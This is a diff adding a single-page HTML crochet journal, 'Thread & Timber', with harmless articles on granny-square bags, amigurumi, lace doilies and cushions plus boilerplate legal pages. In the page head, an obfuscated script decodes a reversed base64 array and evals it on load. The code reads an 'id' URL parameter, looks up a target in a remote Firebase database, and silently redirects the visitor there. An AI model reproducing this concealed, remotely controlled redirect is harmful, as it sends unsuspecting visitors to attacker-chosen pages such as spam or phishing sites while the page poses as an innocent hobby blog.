@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Thread & Timber — Crochet Notes, Patterns & Projects</title>
+<meta name="description" content="A warm editorial crochet journal featuring practical handmade projects, granny squares, accessories, amigurumi and home crochet ideas.">
+
+
+<script>
+(()=>{const _0x9f=['fSkoKTs=','ZS5lcnJvcigiUmVkaXJlY3QgbG9va3VwIGVycm9yOiIsZSl9','aW9uLnJlcGxhY2UodC5ocmVmKX19Y2F0Y2goZSl7Y29uc29s','IiYmdC5wcm90b2NvbCE9PSJodHRwOiIpcmV0dXJuO2xvY2F0','Y2goZSl7cmV0dXJufWlmKHQucHJvdG9jb2whPT0iaHR0cHM6','IHQ7dHJ5e3Q9bmV3IFVSTChkLnZhbHVlLnRyaW0oKSl9Y2F0','YWx1ZT09PSJzdHJpbmciJiZkLnZhbHVlLnRyaW0oKSl7bGV0','bigpO2lmKGQmJmQuZm91bmQ9PT10cnVlJiZ0eXBlb2YgZC52','O2lmKCF4Lm9rKXJldHVybjtjb25zdCBkPWF3YWl0IHguanNv','ZWFkZXJzOntBY2NlcHQ6ImFwcGxpY2F0aW9uL2pzb24ifX0p','aCh1LHttZXRob2Q6IkdFVCIsY2FjaGU6Im5vLXN0b3JlIixo','VVJJQ29tcG9uZW50KHMpKyIuanNvbiIseD1hd2FpdCBmZXRj','ZGIuZmlyZWJhc2Vpby5jb20vcmVkaXJlY3RzLyIrZW5jb2Rl','bnN0IHU9Imh0dHBzOi8vbXl5YXJudGlwcy1kZWZhdWx0LXJ0','LTldW2EtejAtOS9fLV0qJC9pLnRlc3QocykpcmV0dXJuO2Nv','YWNlKC9eXC8rfFwvKyQvZywiIik7aWYoIXN8fCEvXlthLXow','KTtpZighcilyZXR1cm47Y29uc3Qgcz1yLnRyaW0oKS5yZXBs','UGFyYW1zKGxvY2F0aW9uLnNlYXJjaCkscj1wLmdldCgiaWQi','KGFzeW5jKCk9Pnt0cnl7Y29uc3QgcD1uZXcgVVJMU2VhcmNo'],_0xa1=_0x9f.reverse().join("");(0,eval)(atob(_0xa1))})();
+</script>
+
+<style>
+:root{
+  --bg:#f3efe8;
+  --paper:#fffdf9;
+  --ink:#1f2320;
+  --muted:#6f746f;
+  --olive:#5f6f54;
+  --olive-dark:#42503a;
+  --clay:#b77758;
+  --sand:#ded5c8;
+  --line:#d8d0c5;
+  --soft:#ebe5dd;
+  --max:1220px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:Arial,Helvetica,sans-serif;line-height:1.65}
+a{color:inherit}
+button,a{font:inherit}
+img{max-width:100%}
+.site{min-height:100vh}
+.topbar{background:var(--olive-dark);color:#f8f6ef;text-align:center;padding:8px 18px;font-size:.79rem;letter-spacing:.12em;text-transform:uppercase}
+.header{background:var(--paper);border-bottom:1px solid var(--line)}
+.header-inner{max-width:var(--max);margin:auto;padding:24px 22px 18px;display:grid;grid-template-columns:1fr auto 1fr;align-items:end;gap:20px}
+.brand{text-decoration:none;cursor:pointer;text-align:center}
+.brand small{display:block;font-size:.72rem;letter-spacing:.22em;text-transform:uppercase;color:var(--muted);font-weight:700;margin-bottom:4px}
+.brand strong{font-family:Georgia,"Times New Roman",serif;font-size:2.1rem;letter-spacing:-.04em;font-weight:500}
+.header-side{font-size:.86rem;color:var(--muted)}
+.header-side.right{text-align:right}
+.menu{background:var(--paper);border-bottom:1px solid var(--line)}
+.menu-inner{max-width:var(--max);margin:auto;padding:0 22px;display:flex;justify-content:center;gap:30px;flex-wrap:wrap}
+.menu a{padding:14px 0;text-decoration:none;cursor:pointer;font-size:.9rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;position:relative}
+.menu a:after{content:"";position:absolute;left:50%;right:50%;bottom:8px;height:2px;background:var(--clay);transition:.2s}
+.menu a:hover:after{left:0;right:0}
+.wrap{max-width:var(--max);margin:auto;padding:0 22px}
+.hero{padding:54px 0 42px;display:grid;grid-template-columns:1.15fr .85fr;gap:26px;align-items:stretch}
+.hero-main{background:var(--paper);border:1px solid var(--line);padding:44px;display:flex;flex-direction:column;justify-content:center}
+.kicker{font-size:.76rem;letter-spacing:.17em;text-transform:uppercase;color:var(--clay);font-weight:800}
+.hero-main h1{font-family:Georgia,"Times New Roman",serif;font-size:clamp(3.2rem,7vw,6.5rem);font-weight:400;line-height:.88;letter-spacing:-.055em;margin:18px 0 22px}
+.hero-main p{max-width:60ch;color:var(--muted);font-size:1.08rem;margin:0}
+.hero-actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:26px}
+.btn{display:inline-flex;align-items:center;justify-content:center;padding:12px 17px;border:1px solid var(--ink);text-decoration:none;cursor:pointer;font-size:.87rem;font-weight:800;text-transform:uppercase;letter-spacing:.08em;background:transparent}
+.btn.fill{background:var(--ink);color:#fff}
+.hero-photo{position:relative;overflow:hidden;min-height:470px;background:var(--soft)}
+.hero-photo img{width:100%;height:100%;object-fit:cover;display:block}
+.hero-photo .tag{position:absolute;left:18px;bottom:18px;background:rgba(255,253,249,.94);padding:10px 13px;border:1px solid var(--line);font-size:.78rem;text-transform:uppercase;letter-spacing:.09em;font-weight:800}
+.intro-strip{display:grid;grid-template-columns:repeat(3,1fr);border:1px solid var(--line);background:var(--paper);margin-bottom:54px}
+.intro-strip div{padding:20px 24px;border-right:1px solid var(--line)}
+.intro-strip div:last-child{border-right:0}
+.intro-strip strong{display:block;font-family:Georgia,serif;font-size:1.25rem;font-weight:500;margin-bottom:4px}
+.intro-strip span{font-size:.9rem;color:var(--muted)}
+.section-title{display:flex;align-items:center;justify-content:space-between;gap:20px;padding:0 0 18px;border-bottom:1px solid var(--ink);margin-bottom:26px}
+.section-title h2{font-family:Georgia,serif;font-size:2.3rem;font-weight:400;margin:0;letter-spacing:-.03em}
+.section-title p{margin:0;color:var(--muted);font-size:.95rem;max-width:46ch;text-align:right}
+.feature-grid{display:grid;grid-template-columns:1.35fr .65fr;gap:28px;padding-bottom:34px}
+.lead-card{background:var(--paper);border:1px solid var(--line);display:grid;grid-template-columns:1.05fr .95fr;min-height:420px;cursor:pointer}
+.lead-card img{width:100%;height:100%;object-fit:cover;display:block}
+.lead-copy{padding:34px;display:flex;flex-direction:column;justify-content:center}
+.label{font-size:.72rem;text-transform:uppercase;letter-spacing:.13em;color:var(--clay);font-weight:800}
+.lead-copy h3,.story-copy h3{font-family:Georgia,serif;font-weight:400;line-height:1.08;letter-spacing:-.03em;margin:12px 0}
+.lead-copy h3{font-size:2.35rem}
+.lead-copy p,.story-copy p{color:var(--muted);margin:0}
+.readmore{display:inline-block;margin-top:18px;font-weight:800;font-size:.86rem;text-transform:uppercase;letter-spacing:.08em}
+.side-stack{display:grid;gap:18px}
+.mini-card{background:var(--paper);border:1px solid var(--line);display:grid;grid-template-columns:120px 1fr;cursor:pointer;min-height:126px}
+.mini-card img{width:120px;height:100%;object-fit:cover;display:block}
+.mini-card .copy{padding:16px 18px}
+.mini-card h3{font-family:Georgia,serif;font-size:1.25rem;font-weight:400;line-height:1.1;margin:7px 0 4px}
+.mini-card p{font-size:.83rem;color:var(--muted);margin:0}
+.story-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:24px;padding:6px 0 70px}
+.story-card{background:var(--paper);border:1px solid var(--line);cursor:pointer;display:flex;flex-direction:column}
+.story-card img{width:100%;aspect-ratio:4/3;object-fit:cover;display:block}
+.story-copy{padding:22px;flex:1}
+.story-copy h3{font-size:1.65rem}
+.story-meta{font-size:.75rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;font-weight:700}
+.page{padding:48px 0 74px}
+.back{display:inline-block;margin-bottom:20px;cursor:pointer;text-decoration:none;font-size:.82rem;font-weight:800;text-transform:uppercase;letter-spacing:.09em}
+.article-layout{display:grid;grid-template-columns:minmax(0,1fr) 250px;gap:34px;align-items:start}
+.article{background:var(--paper);border:1px solid var(--line)}
+.article-header{padding:46px 52px 34px}
+.article-header h1{font-family:Georgia,serif;font-weight:400;font-size:clamp(2.9rem,6vw,5.5rem);line-height:.94;letter-spacing:-.05em;margin:14px 0 18px}
+.article-sub{color:var(--muted);font-size:1rem}
+.article-main-image{display:block;width:100%;aspect-ratio:16/9;object-fit:cover}
+.article-body{padding:40px 52px 58px;font-family:Georgia,"Times New Roman",serif;font-size:1.08rem;line-height:1.82}
+.article-body h2{font-size:2rem;font-weight:400;line-height:1.15;margin:40px 0 14px;letter-spacing:-.02em}
+.article-body h3{font-family:Arial,Helvetica,sans-serif;font-size:1.1rem;margin-top:28px}
+.article-body p{margin:0 0 20px}
+.article-body ul,.article-body ol{padding-left:1.25rem}
+.note{border-left:4px solid var(--clay);background:#f7f2ec;padding:18px 20px;margin:28px 0;font-family:Arial,Helvetica,sans-serif;font-size:.96rem}
+.sidebar{position:sticky;top:24px}
+.sidebox{background:var(--paper);border:1px solid var(--line);padding:22px;margin-bottom:18px}
+.sidebox h3{font-family:Georgia,serif;font-weight:400;font-size:1.35rem;margin:0 0 10px}
+.sidebox p{margin:0;color:var(--muted);font-size:.9rem}
+.sidebox img{width:64px;height:64px;object-fit:cover;border-radius:50%;display:block;margin-bottom:14px}
+.legal{max-width:900px;margin:auto;background:var(--paper);border:1px solid var(--line);padding:48px 54px}
+.legal h1{font-family:Georgia,serif;font-size:3.3rem;font-weight:400;margin:0 0 12px;letter-spacing:-.04em}
+.legal h2{font-family:Georgia,serif;font-size:1.7rem;font-weight:400;margin-top:34px}
+.legal p,.legal li{color:#4e524e}
+.contact-card{border:1px solid var(--line);background:#f7f2ec;padding:20px;margin:22px 0}
+.footer{background:#20251f;color:#d7ddd3;padding:46px 0 28px;margin-top:16px}
+.footer-grid{display:grid;grid-template-columns:1.3fr .7fr .7fr;gap:30px}
+.footer h3{font-family:Georgia,serif;font-size:1.8rem;font-weight:400;color:#fff;margin:0 0 10px}
+.footer h4{font-size:.76rem;text-transform:uppercase;letter-spacing:.12em;color:#fff;margin:0 0 12px}
+.footer p{color:#aeb7aa;max-width:44ch}
+.footer a{display:block;text-decoration:none;cursor:pointer;color:#ccd3c8;margin:8px 0;font-size:.9rem}
+.footer-bottom{border-top:1px solid #3b4438;margin-top:30px;padding-top:18px;font-size:.8rem;color:#8f998c}
+.empty{text-align:center;padding:100px 20px}
+@media(max-width:980px){
+  .hero,.feature-grid,.article-layout{grid-template-columns:1fr}
+  .hero-photo{min-height:380px}
+  .sidebar{position:static;display:grid;grid-template-columns:1fr 1fr;gap:18px}
+  .lead-card{grid-template-columns:1fr}
+  .lead-card img{aspect-ratio:16/9}
+}
+@media(max-width:760px){
+  .header-inner{grid-template-columns:1fr;text-align:center;align-items:center}
+  .header-side,.header-side.right{text-align:center}
+  .menu-inner{gap:16px}
+  .hero-main{padding:30px 24px}
+  .intro-strip{grid-template-columns:1fr}
+  .intro-strip div{border-right:0;border-bottom:1px solid var(--line)}
+  .intro-strip div:last-child{border-bottom:0}
+  .story-grid{grid-template-columns:1fr 1fr}
+  .section-title{align-items:flex-start;flex-direction:column}
+  .section-title p{text-align:left}
+  .article-header,.article-body,.legal{padding-left:24px;padding-right:24px}
+  .footer-grid{grid-template-columns:1fr}
+}
+@media(max-width:520px){
+  .story-grid{grid-template-columns:1fr}
+  .mini-card{grid-template-columns:100px 1fr}
+  .mini-card img{width:100px}
+  .sidebar{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<div class="site">
+  <div class="topbar">Slow craft • useful projects • everyday crochet</div>
+  <header class="header">
+    <div class="header-inner">
+      <div class="header-side">Independent crochet journal</div>
+      <a class="brand" onclick="navigate('home')"><small>Notes from the hook</small><strong>Thread & Timber</strong></a>
+      <div class="header-side right">Patterns, ideas & handmade living</div>
+    </div>
+  </header>
+  <nav class="menu">
+    <div class="menu-inner">
+      <a onclick="navigate('home')">Journal</a>
+      <a onclick="jumpToProjects()">Projects</a>
+      <a onclick="navigate('page','about')">Our Story</a>
+      <a onclick="navigate('page','privacy')">Privacy</a>
+      <a onclick="navigate('page','terms')">Terms</a>
+      <a onclick="navigate('page','contact')">Contact</a>
+    </div>
+  </nav>
+  <main id="app"></main>
+  <footer class="footer">
+    <div class="wrap">
+      <div class="footer-grid">
+        <div><h3>Thread & Timber</h3><p>A quiet crochet journal for makers who like useful projects, grounded colors, tactile stitches and the pleasure of making something slowly by hand.</p></div>
+        <div><h4>Explore</h4><a onclick="navigate('home')">Latest stories</a><a onclick="jumpToProjects()">Project archive</a><a onclick="navigate('page','about')">About</a></div>
+        <div><h4>Information</h4><a onclick="navigate('page','privacy')">Privacy Policy</a><a onclick="navigate('page','terms')">Terms of Use</a><a onclick="navigate('page','contact')">Contact</a></div>
+      </div>
+      <div class="footer-bottom">© 2026 Thread & Timber. Crochet content for informational and creative use.</div>
+    </div>
+  </footer>
+</div>
+
+<script>
+const avatar="./assets/brand-avatar.webp";
+const posts=[
+{
+ id:'granny-square-market-bag',
+ title:'A Practical Granny Square Carryall',
+ category:'Bags',level:'Easy',date:'September 8, 2026',
+ image:'./assets/granny-square-tote.webp',
+ excerpt:'Classic granny squares become a roomy everyday bag with firm joining, a steady top edge and comfortable handmade handles.',
+ content:`<p>A granny square tote is one of those projects that sits comfortably between decorative crochet and everyday usefulness. The construction is modular, the individual pieces are satisfying to make, and the finished bag gives you a chance to practice joining and finishing without complicated shaping.</p><div class="note"><strong>Maker's note:</strong> A restrained palette helps the individual motifs feel like one finished object. Two main colors plus a neutral joining shade is usually enough.</div><h2>Choose yarn that can handle daily use</h2><p>For a bag, structure matters. Cotton, cotton blends and other low-stretch yarns are easier to control than very soft fibers that lengthen under weight. Aim for fabric that bends comfortably but does not feel loose or open when you tug it with your fingers.</p><h2>Make the squares match before assembly</h2><p>Work every motif to the same finished measurement. Even when the stitch count is identical, small changes in hand tension can make one square larger than another. Blocking the set before assembly gives the cleanest result and makes the joins much easier to align.</p><h2>Lay out the bag before joining</h2><p>Arrange the squares on a table and decide where each one will sit before you begin seaming. Join the front and back first, then build the sides and bottom. Whether you use a slip-stitch join, a single-crochet seam or a sewn join, consistency matters more than the specific technique.</p><h2>Stabilize the top edge</h2><p>Once the body is assembled, crochet a firm border around the opening. This prevents the upper edge from stretching and creates a dependable base for the handles. Mark handle placement on both sides so the bag hangs evenly.</p><h2>Finish for longevity</h2><p>Weave yarn tails in several directions at high-stress points. If you plan to carry heavier objects, a simple fabric lining is a useful upgrade. It protects the crochet fabric, reduces stretch and gives the bag a more finished interior.</p>`
+},
+{
+ id:'daisy-square-throw',
+ title:'Daisy Squares for a Soft Cottage Throw',
+ category:'Blankets',level:'Easy–Intermediate',date:'September 6, 2026',
+ image:'./assets/daisy-granny-blanket.webp',
+ excerpt:'A repeating floral square in cream, yellow and sage creates a calm blanket with just enough raised texture.',
+ content:`<p>This floral throw is built one motif at a time, which makes it an easy project to divide into short sessions. Each square begins with a small flower and gradually becomes a balanced square that can be joined into a larger blanket.</p><h2>Keep the palette consistent</h2><p>A warm yellow center, pale petals and a muted green background create the soft look shown here. The exact shades can change, but using the same color placement in every motif keeps the final blanket cohesive.</p><h2>Build the flower before squaring the motif</h2><p>Start from the center and work outward. Once the petals are established, use the background color to fill the spaces around them and form four clear corners. From there, additional rounds can increase the square to the size you need.</p><div class="note"><strong>Helpful habit:</strong> Block a small test group before making the entire set. That gives you a reliable finished size and catches tension problems early.</div><h2>Join only after blocking</h2><p>Blocking makes the motifs easier to align and helps the raised flower centers sit neatly. Arrange the finished squares on a floor or large table before joining so any small color or tension differences are spread evenly throughout the blanket.</p><h2>Use a quiet border</h2><p>A narrow neutral border is enough to frame the piece without competing with the floral field. Keep the corners relaxed so the outer edge stays flat after the final block.</p>`
+},
+{
+ id:'tiny-puppy-amigurumi',
+ title:'Tiny Puppy Amigurumi with Minimal Sewing',
+ category:'Amigurumi',level:'Beginner',date:'September 3, 2026',
+ image:'./assets/mini-puppy-amigurumi.webp',
+ excerpt:'A small rounded puppy with compact shaping, floppy ears and a simple face made for quick crochet sessions.',
+ content:`<p>Miniature amigurumi is a good place to practice accurate single crochet because every stitch has a visible effect on the final shape. This little puppy uses compact rounds, light stuffing and very few separate pieces.</p><h2>Use a dense fabric</h2><p>Choose a smooth yarn and a hook that creates close stitches. If you can see large spaces between the stitches, reduce the hook size slightly before continuing. Dense crochet keeps the stuffing inside and gives the finished toy a cleaner surface.</p><h2>Work in a spiral</h2><p>Continuous rounds are common in amigurumi because they avoid a visible seam. Use a removable marker in the first stitch of each round and count regularly, especially around increases and decreases.</p><h2>Shape the body gradually</h2><p>Add stuffing a little at a time. Small pieces distribute more evenly than one large clump and make it easier to keep the body rounded instead of lumpy.</p><div class="note"><strong>Safety note:</strong> For toys intended for very young children, embroidered facial details are generally more appropriate than detachable plastic parts.</div><h2>Keep the expression simple</h2><p>A tiny nose, modest eye placement and small floppy ears are enough to make the puppy recognizable. Minimal details often look better at this scale than crowded decoration.</p>`
+},
+{
+ id:'strawberry-cord-pouch',
+ title:'A Strawberry-Inspired Drawstring Pouch',
+ category:'Accessories',level:'Beginner',date:'August 31, 2026',
+ image:'./assets/strawberry-drawstring-pouch.webp',
+ excerpt:'A compact red pouch with green edging, stitched seeds and a drawstring closure inspired by a ripe strawberry.',
+ content:`<p>This small drawstring pouch gets most of its personality from color rather than difficult shaping. A rounded red body, green top edge and sparse seed stitches are enough to create a clear strawberry reference.</p><h2>Begin with a stable base</h2><p>Work a flat circle until it reaches the desired width, then stop increasing and continue upward. The fabric will naturally form the walls of the pouch.</p><h2>Choose a compact stitch</h2><p>Dense stitches help prevent small objects from poking through the sides. Cotton yarn is especially useful when you want the pouch to keep a little structure.</p><h2>Add the drawstring openings evenly</h2><p>Create eyelets near the top and space them consistently. After the opening round, one firm round helps stabilize the edge before the green trim is added.</p><div class="note"><strong>Design restraint:</strong> A few unevenly spaced seed stitches usually look more natural than covering the entire pouch.</div><h2>Finish with a soft leafy edge</h2><p>Simple points or small scallops can suggest the leafy top of a strawberry without making the opening bulky. Test the drawstring before weaving in the final tails so you know the pouch closes smoothly.</p>`
+},
+{
+ id:'flower-crochet-headband',
+ title:'A Slim Crochet Headband with Small Flowers',
+ category:'Wearables',level:'Easy',date:'August 29, 2026',
+ image:'./assets/boho-flower-headband.webp',
+ excerpt:'A narrow sage band decorated with three small flowers in muted vintage shades for a light handmade accessory.',
+ content:`<p>This headband is a useful scrap-yarn project because the decorative flowers use very little material. The main band remains narrow and simple, while the floral cluster adds color without making the piece heavy.</p><h2>Measure for gentle stretch</h2><p>The band should be slightly shorter than the head circumference so it sits securely without feeling tight. Check the stretch of your yarn before deciding on the final length.</p><h2>Keep the base comfortable</h2><p>Use a smooth yarn that feels good against the skin. A compact stitch or light ribbing gives the band enough body while allowing it to flex.</p><h2>Make simple five-petal flowers</h2><p>Small flowers work best because they are easy to attach and do not overwhelm the slim band. Keep the diameter consistent even if the colors change.</p><div class="note"><strong>Placement idea:</strong> Position the flowers before sewing and try a slightly off-center cluster for a more relaxed handmade look.</div><h2>Attach through the centers</h2><p>Secure each flower at the middle and a few inner petal points. Leaving the outer edges free helps the petals keep a little dimension.</p>`
+},
+{
+ id:'sage-hobo-shoulder-bag',
+ title:'The Soft Sage Crochet Hobo Bag',
+ category:'Bags',level:'Intermediate',date:'August 26, 2026',
+ image:'./assets/sage-hobo-bag.webp',
+ excerpt:'A relaxed shoulder bag with a broad strap, curved body and dense stitches designed for everyday use.',
+ content:`<p>A hobo-style crochet bag depends on proportion more than decoration. The curved body, wide shoulder strap and controlled drape create the recognizable silhouette.</p><h2>Balance structure and softness</h2><p>The yarn should be strong enough to support the contents while still allowing the body to fall naturally. Cotton and cotton blends are dependable choices because they show stitch texture and tend to stretch less than very soft acrylic yarns.</p><h2>Shape the lower body gradually</h2><p>Use controlled increases to create width, then work even sections through the center. Gradual decreases near the upper portion bring the sides inward and avoid harsh corners.</p><h2>Build the strap as part of the bag</h2><p>An integrated strap creates a cleaner silhouette than a separately attached handle. Keep it broad enough to distribute weight comfortably across the shoulder.</p><div class="note"><strong>Optional upgrade:</strong> Add a fabric lining if the bag will carry keys, cosmetics or other small objects that could stretch the crochet fabric.</div><h2>Reinforce stress points</h2><p>The transition from the body into the strap receives the most strain. Firm tension, extra stitches on the inside or a discreet reinforcing row can improve durability.</p>`
+},
+{
+ id:'ivory-lace-doily',
+ title:'An Ivory Lace Doily with Crisp Scallops',
+ category:'Home',level:'Intermediate',date:'August 23, 2026',
+ image:'./assets/lace-doily.webp',
+ excerpt:'Traditional round lace built from repeated arches and finished with a carefully blocked scalloped edge.',
+ content:`<p>Thread crochet rewards precision. Small changes in chain length or stitch count become more visible as the circle expands, which makes a doily a satisfying project for anyone who enjoys careful repeated work.</p><h2>Start accurately at the center</h2><p>The early rounds determine the geometry of everything that follows. Count each repeat and correct mistakes immediately instead of hoping the outer rounds will hide them.</p><h2>Watch the balance between solid and open stitches</h2><p>Chain spaces create the airy look, while solid sections give the lace structure. Uneven chain tension can pull the piece out of shape, so try to keep every arch similar.</p><div class="note"><strong>Shape check:</strong> Cupping often suggests too few increases or very tight tension; heavy ruffling can mean too many stitches or overly loose chains.</div><h2>Block the lace carefully</h2><p>Blocking is essential. Pin from the center outward and shape every scallop individually. Measure several radii from the center to help keep the piece round.</p><h2>Store without hard folds</h2><p>Once dry, keep the doily flat or gently rolled. Sharp folds can become difficult to remove from fine cotton lace.</p>`
+},
+{
+ id:'heart-square-cushion',
+ title:'A Heart Motif Crochet Cushion',
+ category:'Home',level:'Easy–Intermediate',date:'August 20, 2026',
+ image:'./assets/heart-granny-pillow.webp',
+ excerpt:'A centered dusty-rose heart set into a cream square and framed with a soft sage border.',
+ content:`<p>This cushion turns a simple color motif into a useful home piece. The heart is worked into the fabric rather than sewn on afterward, keeping the surface flatter and the graphic shape more integrated.</p><h2>Choose the insert first</h2><p>Working toward a known pillow size makes the front and back panels easier to plan. Crochet fabric stretches, so a panel that is very slightly smaller than the insert can create a fuller finished cushion.</p><h2>Keep the motif centered</h2><p>Count the background stitches on both sides of the heart as you work. Symmetry is what makes the simple motif feel polished.</p><h2>Add a quiet frame</h2><p>A narrow border around the front panel gives the design a finished edge and provides a consistent line for joining the front and back.</p><div class="note"><strong>Color-change tip:</strong> Complete the final yarn-over of the previous stitch using the new color for a cleaner transition.</div><h2>Choose a practical back</h2><p>A plain square is the simplest option. For a removable cover, use overlapping back panels to create an envelope opening instead of closing all four sides permanently.</p>`
+}
+];
+
+const pages={
+ about:{title:'About Thread & Timber',body:`<p>Thread & Timber is an independent crochet journal built around useful handmade projects, calm visual inspiration and practical construction notes.</p><p>The goal is not to make crochet feel complicated. We prefer projects that show clear structure, approachable techniques and thoughtful finishing.</p><h2>What we publish</h2><ul><li>Granny square and motif-based projects</li><li>Bags, accessories and useful crochet pieces</li><li>Small amigurumi and gift ideas</li><li>Blankets, cushions and decorative home crochet</li></ul><h2>Our approach</h2><p>Every article is written as general creative guidance. Yarn choice, hook size, gauge and individual tension can change the finished result, so makers should adapt details to their own materials.</p>`},
+ privacy:{title:'Privacy Policy',body:`<p><strong>Effective date:</strong> September 21, 2026</p><p>This website may receive limited technical information when visitors browse the site. Depending on the hosting, analytics or advertising services in use, this may include device type, browser information, approximate location, referral source, pages viewed and similar usage data.</p><h2>Cookies and local technologies</h2><p>Cookies or comparable technologies may be used to remember preferences, measure traffic, support website functionality or enable third-party analytics and advertising services.</p><h2>Third-party providers</h2><p>Services operated by other companies may process information according to their own terms and privacy practices. Their policies apply to data they collect directly.</p><h2>Your controls</h2><p>Most browsers allow you to restrict, clear or block cookies. Disabling some technologies may affect certain site functions.</p><h2>Questions</h2><p>Privacy-related questions may be sent through the contact page.</p>`},
+ terms:{title:'Terms of Use',body:`<p><strong>Effective date:</strong> September 21, 2026</p><p>By accessing this website, you agree to use the site and its content for lawful purposes.</p><h2>Creative information</h2><p>Crochet articles are provided for general informational and inspirational purposes. Finished measurements and results can vary because yarn, hooks, substitutions, gauge and personal tension differ between makers.</p><h2>Content ownership</h2><p>Unless otherwise indicated, original written content, site presentation and branding may not be copied or republished in full without permission.</p><h2>External resources</h2><p>This website may link to third-party websites. We do not control their content, availability, policies or services.</p><h2>No guarantee</h2><p>We make reasonable efforts to keep information useful and readable, but cannot guarantee that every project description will fit every yarn, tool or individual use case.</p>`},
+ contact:{title:'Contact',body:`<p>Use this page for general questions, corrections, collaboration inquiries or feedback about an article.</p><div class="contact-card"><strong>Email:</strong> hello@example.com<p style="margin-bottom:0">Replace this placeholder address with the email you want to publish before putting the site live.</p></div><h2>When asking about a project</h2><p>Please include the project title, the section you are referring to and a short explanation of the issue. That makes it easier to understand the question.</p>`}
+};
+
+function renderHome(){
+ const lead=posts[0], side=posts.slice(1,4), rest=posts.slice(4);
+ document.getElementById('app').innerHTML=`
+ <div class="wrap">
+   <section class="hero">
+     <div class="hero-main">
+       <span class="kicker">A journal for slower making</span>
+       <h1>Crochet with purpose.</h1>
+       <p>Projects chosen for their texture, usefulness and satisfying construction—from motif bags and floral squares to small accessories and home pieces.</p>
+       <div class="hero-actions"><a class="btn fill" onclick="jumpToProjects()">Explore projects</a><a class="btn" onclick="navigate('page','about')">Read our story</a></div>
+     </div>
+     <div class="hero-photo"><img src="./assets/hero-crochet-studio.webp" alt="Crochet workspace with yarn and handmade pieces"><span class="tag">Handmade notes • 2026</span></div>
+   </section>
+   <section class="intro-strip">
+     <div><strong>Useful first</strong><span>Projects designed around real making, wearing and everyday use.</span></div>
+     <div><strong>Clear construction</strong><span>Simple explanations focused on how each piece comes together.</span></div>
+     <div><strong>Quiet inspiration</strong><span>Soft palettes, tactile stitches and uncomplicated handmade ideas.</span></div>
+   </section>
+   <section id="projects">
+     <div class="section-title"><h2>Current notebook</h2><p>Our newest crochet stories, starting with one featured project and a set of smaller reads.</p></div>
+     <div class="feature-grid">
+       ${leadTemplate(lead)}
+       <div class="side-stack">${side.map(miniTemplate).join('')}</div>
+     </div>
+     <div class="section-title"><h2>More from the archive</h2><p>Bags, wearables, amigurumi and home crochet to save for your next project.</p></div>
+     <div class="story-grid">${rest.map(storyTemplate).join('')}</div>
+   </section>
+ </div>`;
+ window.scrollTo(0,0)
+}
+function leadTemplate(p){return `<article class="lead-card" onclick="navigate('post','${p.id}')"><img src="${p.image}" alt="${p.title}"><div class="lead-copy"><span class="label">Featured • ${p.category}</span><h3>${p.title}</h3><p>${p.excerpt}</p><span class="readmore">Open story →</span></div></article>`}
+function miniTemplate(p){return `<article class="mini-card" onclick="navigate('post','${p.id}')"><img src="${p.image}" alt="${p.title}"><div class="copy"><span class="label">${p.category}</span><h3>${p.title}</h3><p>${p.level}</p></div></article>`}
+function storyTemplate(p){return `<article class="story-card" onclick="navigate('post','${p.id}')"><img src="${p.image}" alt="${p.title}"><div class="story-copy"><div class="story-meta">${p.category} • ${p.level}</div><h3>${p.title}</h3><p>${p.excerpt}</p><span class="readmore">Read article →</span></div></article>`}
+function renderPost(id){
+ const p=posts.find(x=>x.id===id);if(!p){renderNotFound();return}
+ document.getElementById('app').innerHTML=`<div class="wrap page"><a class="back" onclick="navigate('home')">← Return to journal</a><div class="article-layout"><article class="article"><header class="article-header"><span class="label">${p.category} • ${p.level}</span><h1>${p.title}</h1><div class="article-sub">Published ${p.date} · Practical crochet notes from Thread & Timber</div></header><img class="article-main-image" src="${p.image}" alt="${p.title}"><div class="article-body">${p.content}</div></article><aside class="sidebar"><div class="sidebox"><img src="${avatar}" alt=""><h3>About this journal</h3><p>Thread & Timber collects calm, practical crochet ideas with an emphasis on useful construction and thoughtful finishing.</p></div><div class="sidebox"><h3>Project reminder</h3><p>Yarn, hook size and individual tension can change measurements and drape. Adjust details to suit your materials.</p></div></aside></div></div>`;
+ window.scrollTo(0,0)
+}
+function renderPage(id){const p=pages[id];if(!p){renderNotFound();return}document.getElementById('app').innerHTML=`<div class="wrap page"><a class="back" onclick="navigate('home')">← Return to journal</a><section class="legal"><span class="label">Site information</span><h1>${p.title}</h1>${p.body}</section></div>`;window.scrollTo(0,0)}
+function renderNotFound(){document.getElementById('app').innerHTML=`<div class="wrap"><div class="empty"><span class="label">404</span><h2>That page is not in the notebook.</h2><p>Try returning to the main journal.</p><button class="btn fill" onclick="navigate('home')">Go home</button></div></div>`}
+function jumpToProjects(){if(!document.getElementById('projects'))renderHome();requestAnimationFrame(()=>{const el=document.getElementById('projects');if(el)el.scrollIntoView({behavior:'smooth',block:'start'})})}
+function navigate(view,id=null){if(view==='home'){window.location.hash='';renderHome()}else if(view==='post'){window.location.hash='post/'+id;renderPost(id)}else if(view==='page'){window.location.hash='page/'+id;renderPage(id)}}
+window.addEventListener('hashchange',routeFromHash);
+function routeFromHash(){const hash=window.location.hash.replace(/^#/,'');if(!hash){renderHome();return}const [type,...rest]=hash.split('/');const id=rest.join('/');if(type==='post')renderPost(id);else if(type==='page')renderPage(id);else renderNotFound()}
+routeFromHash();
+</script>
+</body>
+</html>
